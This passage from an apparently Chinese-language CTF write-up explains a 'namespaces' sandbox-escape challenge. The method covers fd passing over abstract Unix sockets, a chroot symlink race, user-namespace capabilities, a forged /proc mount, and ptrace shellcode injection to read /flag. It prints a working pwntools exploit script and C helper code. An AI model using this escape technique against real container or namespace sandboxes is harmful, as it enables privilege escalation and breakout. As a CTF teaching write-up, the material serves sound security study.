class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_fd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">child_func</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    fd = global_fd;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (chroot(<span class="string">&quot;namespace1&quot;</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;chroot failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    DIR *dir = opendir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dir == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[Child] Failed to open root directory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Child] Listing root directory contents:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((entry = readdir(dir)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Child] %s\n&quot;</span>, entry-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        buffer[bytes_read] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Child] Flag content: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;[Child] Failed to read the flag file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *<span class="built_in">stack</span>;</span><br><span class="line">    <span class="type">char</span> *stack_top;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> flags = SIGCHLD;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> = <span class="built_in">malloc</span>(STACK_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">stack</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    stack_top = <span class="built_in">stack</span> + STACK_SIZE;</span><br><span class="line">    </span><br><span class="line">    global_fd = open(<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (global_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to open flag file in parent&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    pid = clone(child_func, stack_top, CLONE_NEWNS | CLONE_NEWCGROUP | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET | flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    close(global_fd);</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">stack</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	这里就引入了我们在背景知识中提到的socket AF_UNIX通信，它可以用来作为进程间通信的工具，他主要分为三种<strong>pathname</strong>，<strong>unnamed</strong>，<strong>abstract</strong>，这三种可以简单说一下，<strong>pathname</strong>是通过文件来实现进程间通信的，但是对于本题来说，由于namespace中设置了mnt namespace，所以不同沙盒中的进程是看不到共同的文件路径的中文件的，因此这个方法行不通，对于<strong>unnamed</strong>来说，主要是用来接受进程间通信的信息的可以用来接受后面fd的步骤，之后对于<strong>abstract</strong>来说，通过创建一个匿名文件来进行进程间通信，非常符合本题的要求，因此我们通过<strong>abstract</strong>来发送文件描述符给另一个沙盒程序，然后他用<strong>unnamed</strong>来接受文件描述符。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>​	为了成功读取 flag 文件并提升权限，我们需要仔细研究 namespace 设置的顺序，通常按照 <strong>user</strong>、<strong>mnt</strong>、<strong>pid</strong>、<strong>uts</strong>、<strong>ipc</strong> 和 <strong>cgroup</strong> 的顺序进行操作。在设置 pid namespace 时，通过 fork 创建子进程，子进程进入目标的 pid namespace，才能看到该沙盒内的进程，并进行后续操作。namespace 设置完毕后，再进行权限设置。此时，可以使用 ptrace 来监控 pid namespace 中的进程，检测到新的进程加入时，使用 ptrace 调试并修改其 rip 寄存器，使其指向预设的 shellcode，执行读取 flag 文件的操作，从而实现特权提升并获取 flag。</p>
<p><img src="/images/namespace/1735447328412.jpg" alt="1735447328412"></p>
<p>​	但是在写exp的时候发现一个问题也就是，linux中存在<strong>capabilities</strong>机制，在过去的 Linux 系统中，sudo 和 SUID（Set User ID）机制让普通用户可以执行 root 权限的操作，但这两者都会赋予普通用户完整的 root 权限，存在较大的安全风险。为了解决这个问题，Linux 从内核 2.2 开始引入了 <strong>capabilities</strong> 机制，将 root 权限细分为多个独立的能力，每个能力对应系统中特定的操作。通过这种方式，进程只会获得执行特定任务所需的权限，而无需赋予其完整的 root 权限。</p>
<p><strong>Capabilities</strong> 机制 允许进程获得执行特定任务所需的权限，而不需要拥有 root 权限。普通用户通常没有 <strong>capabilities</strong>，而 root 用户拥有所有的 <strong>capabilities</strong>。当进程创建或加入新的 user namespace 时，无论其 UID 和 GID 如何变化，都会获得新 namespace 中的 root 权限和所有 <strong>capabilities</strong>。尽管如此，新的 user namespace 中的 root 用户仍然受到一些限制，例如无法访问不在该 namespace 中映射的文件。此外对于在使用<strong>execve</strong>执行用户输入的elf后将不具有任何的<strong>capabilities</strong>，因此也就没有办法直接使用ptrace对于其他进程进行修改rip的操作。</p>
<p>​	新建 user namespaces 本身并不需要任何特殊的 <strong>capabilities</strong>，因此可以通过创建新的 user namespace 获取所有 <strong>capabilities</strong>，从而执行特权操作。然而，chroot 后的进程无法创建新的 user namespaces，这一限制旨在防止 chroot 环境中的进程逃逸。通过这种机制，Linux 实现了对 root 权限的细粒度控制，既保证了安全性，又提供了灵活性。因此为了逃逸Chroot我们需要进行条件竞争，按照下述流程首先删除&#x2F;c目录然后把&#x2F;c目录指向&#x2F;目录，之后c沙盒其实就是在根目录的环境了也就可以创建user namespace</p>
<ol>
<li><strong>c沙盒start_sandbox创建&#x2F;tmp&#x2F;chroots&#x2F;c</strong></li>
<li><strong>a沙盒中的进程检测到&#x2F;tmp&#x2F;chroots&#x2F;c，将其替换为软链接</strong></li>
<li><strong>c沙盒chroot到&#x2F;tmp&#x2F;chroots&#x2F;c</strong></li>
</ol>
<p>​	逃逸后，我们可以通过在新的 user namespace 中创建命名空间并使用 ptrace 进行调试操作，但如果进程进入到新的 user namespace，它将无法访问之前的 pid namespace，因此也无法观测和修改沙盒中的进程。</p>
<p>​	为了解决这一问题，我们可以同时clone的时候加入 user namespace， pid namespace，但这会导致进程不再处于原有的 pid namespace 中，无法直接通过 ptrace 修改沙盒进程，即run_elf的进程只会setns到start_sandbox里面的父进程中，而这时我们可以有ptrace能力的是子进程，并且与父进程不在同一个pid中。此时，我们需要利用mnt namespace对 &#x2F;proc 目录进行修改。具体而言，需要加入user namespace pid namespace 和 mnt namespace 三个标志，这样可以通过修改 &#x2F;proc，并在子进程中将原本的 &#x2F;proc 保存到其他地方，重新挂载一个空的 &#x2F;proc。接着，我们可以在原先父进程的 pid namespace 位置创建一个符号链接，指向子进程的 pid namespace。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Holding CAP_SYS_ADMIN within the user namespace that owns a process’s mount namespace allows that process to create bind mounts and mount the following types of filesystems:</span><br><span class="line"></span><br><span class="line">- /proc (since Linux 3.8)</span><br><span class="line">- /sys (since Linux 3.8)</span><br><span class="line">- devpts (since Linux 3.9)</span><br><span class="line">- tmpfs(5) (since Linux 3.9)</span><br><span class="line">- ramfs (since Linux 3.9)</span><br><span class="line">- mqueue (since Linux 3.9)</span><br><span class="line">- bpf (since Linux 4.4)</span><br></pre></td></tr></table></figure>

<p>​	由于父子进程处于同一个目录下，子进程在 mnt namespace 中的挂载操作会自动传播到父进程，这样父进程的 &#x2F;proc 将与子进程的 &#x2F;proc 保持一致。最终，父进程会看到伪造后的 &#x2F;proc，从而加入到子进程的 pid namespace 中，这时。这时，子进程便能够通过 ptrace 注入 shellcode，成功读取 &#x2F;flag 文件，从而完成提权操作。</p>
<p>​	为了提高最终成功执行 ptrace 的概率，我们可以在伪造的 &#x2F;proc 中将 uts namespace 设置为一个 FIFO 管道，这样当 run_elf 进程在此处阻塞时，CPU 将转而执行 start_sandbox 子进程中的 ptrace 操作。尽管这一额外步骤并非必需，但它可以增加成功的几率，从而使得 ptrace 成功执行。</p>
<p>​	此外借用<a target="_blank" rel="noopener" href="https://liotree.github.io/2022/08/12/35c3ctf-Pwn-namespaces/">文章</a>中提到的，有一个常见的误解是，ptrace 需要被跟踪的进程首先调用 ptrace(PTRACE_TRACEME, 0, 0, 0) 才能成功执行。但经过实验后发现，并非如此（否则类似 strace 的工具就无法追踪进程了）。虽然 man 文档中对于 PTRACE_TRACEME 的描述比较模糊，但在更详细的文档中可以找到解释：PTRACE_TRACEME 用于指示该进程将被其父进程跟踪，任何除 SIGKILL 之外的信号都会导致该进程停止，并通过 wait(2) 通知父进程。而且，当该进程之后调用 execve(2) 时，会发送 SIGTRAP 信号给进程，父进程有机会在新程序执行前获得控制。这是 ptrace 成功执行的关键步骤之一。当前文档中这段描述已经被去除，但其原始含义是十分重要的。</p>
<h2 id="exp脚本详解"><a href="#exp脚本详解" class="headerlink" title="exp脚本详解"></a>exp脚本详解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;./namespaces&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># compile all four binaries</span></span><br><span class="line">    prepare_bins()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="comment"># r = process(&quot;./namespaces&quot;)</span></span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    hook_recv(r)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># start sandbox 0 and 1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        start_sandbox(<span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;[sleep]  Started sleep&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># send fd in sandbox 0</span></span><br><span class="line">    run_file(<span class="number">0</span>, <span class="string">&#x27;sendfd&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[sendfd]  Accepting&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># recv fd in sandbox 1, race creation of chroot for sandbox 2</span></span><br><span class="line">    run_file(<span class="number">1</span>, <span class="string">&#x27;recvfd&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[recvfd]  Starting race&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># start sandbox 2, hope we win the race</span></span><br><span class="line">    <span class="comment"># inside sandbox 2, set a trap for the next process joining sandbox 2</span></span><br><span class="line">    start_sandbox(<span class="string">&#x27;escalate&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[escalate]  Waiting for victim to join&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># let a process join sandbox 2 to escalate to root</span></span><br><span class="line">    run_file(<span class="number">2</span>, <span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;DONE&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sandbox</span>(<span class="params">init</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    success(<span class="string">&quot;Starting sandbox: %s&quot;</span>, init)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    send_elf(init)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_file</span>(<span class="params">idx, elf</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    success(<span class="string">&quot;Running in sandbox #%d: %s&quot;</span>, idx, elf)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;which sandbox? &#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    send_elf(elf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_elf</span>(<span class="params">elf</span>):</span><br><span class="line">    elf = bins[elf]</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;elf len? &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(elf)).encode())</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;data? &#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> context.local(log_level=<span class="string">&#x27;INFO&#x27;</span>):</span><br><span class="line">        r.send(elf)</span><br><span class="line">    </span><br><span class="line">    log.debug(<span class="string">&quot;Sent ELF file&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_bins</span>():</span><br><span class="line">    <span class="keyword">global</span> bins</span><br><span class="line">    bins = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    names = <span class="string">&#x27;sleep sendfd recvfd escalate&#x27;</span>.split()</span><br><span class="line">    rand = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line">    sc = shellcode()</span><br><span class="line">    </span><br><span class="line">    directory = tempfile.mkdtemp()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        os.system(<span class="string">&#x27;gcc -Wall -Wextra -Wno-unused-function -O3 -static -m64 -o %s/bin binaries.c -DMAIN=%s -DRAND=%s -DSHELLCODE=%s&#x27;</span> %</span><br><span class="line">                  (directory, name, rand, sc))</span><br><span class="line">        bins[name] = read(directory + <span class="string">&#x27;/bin&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    shutil.rmtree(directory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shellcode</span>():</span><br><span class="line">    sc = shellcraft.echo(<span class="string">&#x27;[shellcode]  FLAG: &#x27;</span>) + shellcraft.cat(<span class="string">&#x27;/flag&#x27;</span>) + \</span><br><span class="line">        shellcraft.echo(<span class="string">&#x27;[shellcode]  DONE&#x27;</span>) + shellcraft.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    sc = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">16</span> + asm(sc)</span><br><span class="line">    sc = <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">8</span> - (<span class="built_in">len</span>(sc) % <span class="number">8</span>)) + sc</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(sc) % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Shellcode:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hexdump(sc))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    </span><br><span class="line">    sc = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, unpack_many(sc, <span class="number">8</span>)))</span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_recv</span>(<span class="params">r</span>):</span><br><span class="line">    old_recv = r.recv_raw</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_recv</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        ret = old_recv(*args, **kwargs)</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> ret.splitlines():</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;[&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                <span class="built_in">print</span>(line[line.index(<span class="string">b&#x27;[&#x27;</span>):])</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line">    </span><br><span class="line">    r.recv_raw = new_recv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p>​	首先介绍一下exp这个脚本，他主要的工作便是编译binaries.c脚本，生成不同的exp发送给容器中，然后根据对应顺序执行，并且生成了对应的shellcode也一同提供给exp中，原仓库中的脚本本来时python2的我这里进行简单的修改。</p>
<p>​	之后便是对于binaries.c的文件进行详细的阐述，首先也就是最简单的do_sleep函数，这里十分简单就是sleep，通过sleep创建两个sandbox方便后面利用run_elf来进行chroot逃逸。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_sleep</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是do_sendfd，这里其实就是利用了之前说的<strong>abstract</strong> socket进行进程之间的通信，然后发送fd信息给另一个进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_sendfd</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Opening fd&quot;</span>);</span><br><span class="line">    <span class="type">int</span> fd = CHECK_CALL(open, <span class="string">&quot;/&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    setup_socket_and_send_fd(fd);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">setup_socket_and_send_fd</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sock;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> addrlen;</span><br><span class="line">    create_socket(&amp;sock, &amp;addr, &amp;addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Binding&quot;</span>);</span><br><span class="line">    CHECK_CALL(bind, sock, &amp;addr, addrlen);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Listening&quot;</span>);</span><br><span class="line">    CHECK_CALL(listen, sock, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Accepting&quot;</span>);</span><br><span class="line">    <span class="type">int</span> conn = CHECK_CALL(accept, sock, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    send_fd(conn, fd);</span><br><span class="line"></span><br><span class="line">    close(conn);</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">create_socket</span><span class="params">(<span class="type">int</span> *sock, <span class="keyword">struct</span> sockaddr_un *addr, <span class="type">socklen_t</span> *addrlen)</span> &#123;</span><br><span class="line">    info(<span class="string">&quot;Creating socket&quot;</span>);</span><br><span class="line">    *sock = CHECK_CALL(socket, AF_UNIX, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;Creating addr&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(addr, <span class="number">0</span>, <span class="keyword">sizeof</span> *addr);</span><br><span class="line">    addr-&gt;sun_family = AF_UNIX;</span><br><span class="line">    <span class="built_in">strncpy</span>(addr-&gt;sun_path, <span class="string">&quot;@&quot;</span> STR(RAND), <span class="keyword">sizeof</span> addr-&gt;sun_path - <span class="number">1</span>);</span><br><span class="line">    *addrlen = offsetof(<span class="keyword">struct</span> sockaddr_un, sun_path) + <span class="built_in">strlen</span>(addr-&gt;sun_path) + <span class="number">1</span>;</span><br><span class="line">    addr-&gt;sun_path[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	同理do_recvfd也是类似，这里我们之前讲述原理的时候也做过实验，fd是可以在不同namespace中传递的，因此这里按照之前所说的原理，首先不断循环检测..&#x2F;2文件夹是否存在，如果存在说明有了新的sandbox加入，然后就把他删除，之后通过symlinkat命令，把这个文件夹指向根目录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 